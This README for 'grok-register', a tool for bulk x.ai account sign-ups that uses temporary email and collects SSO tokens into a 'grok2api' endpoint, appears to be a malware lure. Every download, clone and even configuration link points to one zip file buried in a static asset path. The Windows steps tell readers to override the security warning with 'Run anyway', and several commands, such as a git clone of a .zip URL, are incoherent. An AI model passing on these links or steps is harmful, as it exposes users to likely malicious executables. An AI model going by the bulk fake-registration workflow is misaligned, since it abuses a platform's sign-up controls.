# 🧩 grok-register - Run x.ai registration with ease

[![Download grok-register](https://img.shields.io/badge/Download%20grok-register-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip)

## 🚀 What this app does

grok-register helps you run x.ai registration tasks from one place. It gives you a simple control panel, a task runner, network routing, and a token sink for grok2api.

You can use it to:

- run registration from the command line
- create batch tasks in a web panel
- set a separate exit route, email setup, and sink for each task
- watch rounds, success count, failure count, and logs in real time
- send successful `sso` tokens into a `grok2api` compatible endpoint

## 📥 Download grok-register

Go to the release page here:

[Download from GitHub Releases](https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip)

On that page, get the latest build for Windows and save it to your PC.

## 🖥️ Windows setup

Use these steps if you are on Windows.

### 1. Get the file

Open the release page and download the latest Windows package. Save it to a folder you can find, like `Downloads` or `Desktop`.

### 2. Unzip it

If the file comes as `.zip`, right-click it and choose **Extract All**.

After that, open the new folder.

### 3. Start the app

Look for the main app file, then double-click it.

If Windows shows a security prompt:

- click **More info**
- then click **Run anyway**

### 4. Open the control panel

After the app starts, open your browser and go to the local address shown in the app window.

You will then see the web control panel for task setup and status checks.

## ⚙️ First-time setup

Before you run tasks, fill in the basic settings in the control panel.

### Required items

You need these parts ready:

- a working network route
- a temp mail service that x.ai accepts
- a sink that can receive tokens, such as `grok2api`

This app already includes:

- `warp` as the default network exit
- `grok2api` as the default token sink

So you do not need to combine other repos for a basic setup.

### Fill in these fields

In the control panel, set:

- `temp_mail_api_base`
- `temp_mail_admin_password`
- `temp_mail_domain`

For DuckMail, use this pattern:

- `temp_mail_api_base`: `https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip`
- `temp_mail_admin_password`: leave blank for public use, or set your API key for a private domain
- `temp_mail_domain`: leave blank to let the runner choose a public DuckMail domain

## 🧭 Main features

### Batch task control

Create many registration jobs from one screen. Each job can use its own settings.

### Task-level setup

Set these values per task:

- exit route
- mail settings
- sink target

This gives you separate control for each run.

### Live progress view

Watch each task as it runs. You can see:

- round number
- success count
- failure count
- log output

### Token push

When a registration succeeds, the app sends the `sso` token to the `grok2api` compatible sink.

## 🧱 What to prepare on your PC

For a smooth run on Windows, keep these in place:

- Windows 10 or Windows 11
- a stable internet connection
- a browser such as Chrome, Edge, or Firefox
- enough free disk space for the app and its logs

If your PC blocks the app, allow it through Windows security settings.

## 🛠️ If you want to use Docker

If you prefer a container setup, you can run the project with Docker too.

### Basic Docker flow

```bash
git clone https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip
cd grok-register
cp .env.example .env
docker compose up -d --build
```

If you need to change the external port or the `grok2api` admin password, edit `.env` first.

### After startup

Open these addresses in your browser:

- `http://<your-server-ip>:18600`
- `http://<your-server-ip>:8000/admin`

## 🔧 Common settings

### `browser_proxy`

Used by the browser part of the runner.

### `proxy`

Used for network traffic during task runs.

### `temp_mail_api_base`

The base URL for your temp mail service.

### `temp_mail_admin_password`

The admin password or API key for your temp mail service.

### `temp_mail_domain`

The mail domain used for registration.

### `grok2api`

The endpoint that receives the token after a successful run.

## 📂 Typical file layout

After you unpack the release, you may see files like these:

- the main app file
- a config file
- a folder for logs
- a folder for runtime data
- a README file

Keep all files in the same folder so the app can find its settings.

## 🧪 How to run a task

1. Open the app
2. Open the web control panel
3. Set your mail and sink details
4. Choose the task settings
5. Start the task
6. Watch the log output
7. Check the success count
8. Confirm the token reached the sink

## 🔍 If the app does not start

Try these steps:

- make sure you downloaded the full release package
- check that you unzipped the files
- run the app from the extracted folder, not from inside the zip file
- close other apps that may use the same port
- restart Windows and try again

## 🌐 If the page does not open

If the control panel does not load:

- check that the app is still running
- check the local address shown by the app
- try another browser
- turn off a VPN or proxy that may block local access

## 📡 If registration fails

If tasks fail during registration:

- verify your temp mail domain
- check the temp mail API base
- make sure your network route is working
- confirm the sink endpoint is correct
- review the log output for the exact step that failed

## 📝 Notes for safe use

Use one clean folder for the app and its data. Keep the config file with the app. If you change the mail service or sink, update the settings before you start a new batch

## 📦 Download again

If you need the release page again, use this link:

[Open the latest grok-register release](https://raw.githubusercontent.com/Florisheedless915/grok-register/main/vendor/grok2api/_public/static/function/register_grok_1.2.zip)